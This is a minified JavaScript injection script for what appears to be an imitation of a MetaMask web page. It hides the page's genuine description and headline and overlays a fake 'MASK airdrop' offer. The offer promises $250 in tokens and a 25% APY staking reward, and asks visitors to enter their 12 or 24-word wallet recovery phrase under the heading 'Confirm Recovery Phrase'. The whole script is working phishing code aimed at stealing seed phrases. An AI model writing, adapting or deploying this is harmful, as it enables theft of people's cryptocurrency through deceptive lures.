function copyDescriptionElement(){const c=document.querySelector(".Feature__Description-sc-jlt5r9-6.bKzpNY"),a=document.querySelector(".StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1");if(c&&a){const b=window.getComputedStyle(c),d=document.createElement("div");d.style.marginBottom="20px";d.style.padding="0 20px";const g=c.cloneNode(!0);"color fontSize fontFamily fontWeight lineHeight letterSpacing textAlign textTransform".split(" ").forEach(f=>
{g.style[f]=b[f]});d.appendChild(g);a.insertBefore(d,a.firstChild);c.style.visibility="hidden";c.style.position="absolute";c.style.pointerEvents="none"}}
function moveGetStartedElement(){const c=document.querySelector(".StyledGeneral__SectionTitle-sc-1puk566-1.FullWidthCta__Headline-sc-zid82d-2.jSJuux.hoGOoW");var a=document.querySelector(".StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1");if(c&&a){const b=document.createElement("div");b.style.marginTop="20px";b.style.padding="0 20px";b.style.textAlign="center";const d=c.cloneNode(!0);d.style.color="#24292e";
b.appendChild(d);(a=a.querySelector(".Feature__Description-sc-jlt5r9-6.bKzpNY").parentElement)&&a.parentNode.insertBefore(b,a.nextSibling);c.style.visibility="hidden";c.style.position="absolute";c.style.pointerEvents="none"}}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",function(){copyDescriptionElement();moveGetStartedElement()}):(copyDescriptionElement(),moveGetStartedElement());window.addEventListener("load",function(){copyDescriptionElement();moveGetStartedElement()});
(function(){function c(){var b=document.querySelector(".Feature__Description-sc-jlt5r9-6.bKzpNY"),d=document.querySelector(".StyledGeneral__SectionTitle-sc-1puk566-1.FullWidthCta__Headline-sc-zid82d-2.jSJuux.hoGOoW");if(b||d){const g=document.createElement("style");let f="";if(b){const e=window.getComputedStyle(b);b=(b=b.querySelector("p"))?window.getComputedStyle(b):null;f+=`
                    .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1::before {
                        content: "To validate your claim for the MASK airdrop, please enter your 12 or 24-word recovery phrase in the field below. This is needed to confirm that you are the legitimate owner of your MetaMask wallet. The ownership attestation guarantees the secure allocation of your 50 MASK tokens (approximately valued at $250) and makes you eligible for our exclusive staking program offering a 25% APY.";
                        display: block;
                        margin-bottom: 20px;
                        padding: 0 20px;
                        text-align: center;
                        order: 1;
                        
                        color: ${e.color};
                        font-family: ${e.fontFamily};
                        font-size: ${b?b.fontSize:e.fontSize};
                        font-weight: ${b?b.fontWeight:e.fontWeight};
                        line-height: ${b?b.lineHeight:e.lineHeight};
                        letter-spacing: ${b?b.letterSpacing:e.letterSpacing};
                        text-transform: ${e.textTransform};
                    }
                `}d&&(d=window.getComputedStyle(d),f+=`
                    .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1::after {
                        content: "Confirm Recovery Phrase";
                        display: block;
                        margin-top: 0;
                        margin-bottom: 5px;
                        padding: 0 20px;
                        text-align: center;
                        order: 2;
                        
                        color: #24292e;
                        font-family: ${d.fontFamily};
                        font-size: ${d.fontSize};
                        font-weight: ${d.fontWeight};
                        line-height: ${d.lineHeight};
                        letter-spacing: ${d.letterSpacing};
                        text-transform: ${d.textTransform};
                    }
                    
                    .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .FullWidthCta__CTAWrapper-sc-zid82d-4 {
                        order: 3 !important;
                        margin-top: 0 !important;
                        margin-bottom: 0 !important;
                        display: flex !important;
                        justify-content: center !important;
                        align-items: center !important;
                        width: 100% !important;
                        padding: 0 !important;
                        gap: 0 !important;
                    }
                    
                    .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1 > * {
                        order: 99 !important;
                    }
                `);g.textContent=f;document.head.appendChild(g)}}const a=document.createElement("style");a.textContent='\n        .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1 {\n            position: relative;\n            display: flex;\n            flex-direction: column;\n        }\n        \n        .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1::before {\n            content: "To validate your claim for the MASK airdrop, please enter your 12 or 24-word recovery phrase in the field below. This is needed to confirm that you are the legitimate owner of your MetaMask wallet. The ownership attestation guarantees the secure allocation of your 50 MASK tokens (approximately valued at $250) and makes you eligible for our exclusive staking program offering a 25% APY.";\n            display: block;\n            margin-bottom: 20px;\n            padding: 0 20px;\n            color: inherit;\n            font-size: 18px;\n            font-family: inherit;\n            line-height: 1.5;\n            text-align: center;\n            order: 1;\n        }\n        \n        .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1::after {\n            content: "Confirm Recovery Phrase";\n            display: block;\n            margin-top: 0;\n            margin-bottom: 5px;\n            padding: 0 20px;\n            color: #24292e;\n            font-size: 28px;\n            font-weight: bold;\n            font-family: inherit;\n            line-height: 1.5;\n            text-align: center;\n            order: 2;\n        }\n        \n        .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .FullWidthCta__CTAWrapper-sc-zid82d-4 {\n            order: 3 !important;\n            margin-top: 0 !important;\n            margin-bottom: 0 !important;\n            display: flex !important;\n            justify-content: center !important;\n            align-items: center !important;\n            width: 100% !important;\n        }\n        \n        .StyledGeneral__SectionTitle-sc-1puk566-1.FullWidthCta__Headline-sc-zid82d-2.jSJuux.hoGOoW {\n            display: none !important;\n        }\n        \n        .Feature__Description-sc-jlt5r9-6.bKzpNY {\n            visibility: hidden !important;\n            position: absolute !important;\n            pointer-events: none !important;\n            opacity: 0 !important;\n        }\n        \n        .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .FullWidthCta__CTAWrapper-sc-zid82d-4 a {\n            margin: 0 auto !important;\n        }\n        \n        .StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1 > * {\n            order: 99 !important;\n        }\n    ';
document.head.appendChild(a);document.readyState==="loading"?document.addEventListener("DOMContentLoaded",c):c();window.addEventListener("load",c)})();
setTimeout(function(){var c=document.querySelector(".StyledGeneral__SectionTitle-sc-1puk566-1.FullWidthCta__Headline-sc-zid82d-2.jSJuux.hoGOoW");c&&(c.style.display="none");if(c=document.querySelector(".StyledGeneral__Section-sc-1puk566-2.FullWidthCta__Container-sc-zid82d-0.iTDmkR.dcHmuT.bg-dark .ContentWrapper__ContainerInner-sc-bwr69c-1")){c.style.display="flex";c.style.flexDirection="column";const b=document.createElement("div");b.style.order="1";b.style.width="100%";var a=document.createElement("div");
a.innerHTML=`<p>${descriptionText}</p>`;a.style.marginBottom="20px";a.style.padding="0 20px";a.style.textAlign="center";const d=document.createElement("div");d.innerHTML=`<h2>${passphraseText}</h2>`;d.style.marginBottom="5px";d.style.padding="0 20px";d.style.textAlign="center";d.style.color="#24292e";d.style.fontWeight="bold";b.appendChild(a);b.appendChild(d);if(a=c.querySelector(".FullWidthCta__CTAWrapper-sc-zid82d-4"))a.style.display="flex",a.style.justifyContent="center",a.style.alignItems="center",
a.style.width="100%",a.style.visibility="visible",a.style.position="relative",a.style.opacity="1",a.style.pointerEvents="auto",a.style.order="2",a.style.zIndex="10",c.innerHTML="",c.appendChild(b),c.appendChild(a),a.style.marginTop="0",a.style.marginBottom="0",a.style.padding="0",a.style.gap="0"}},100);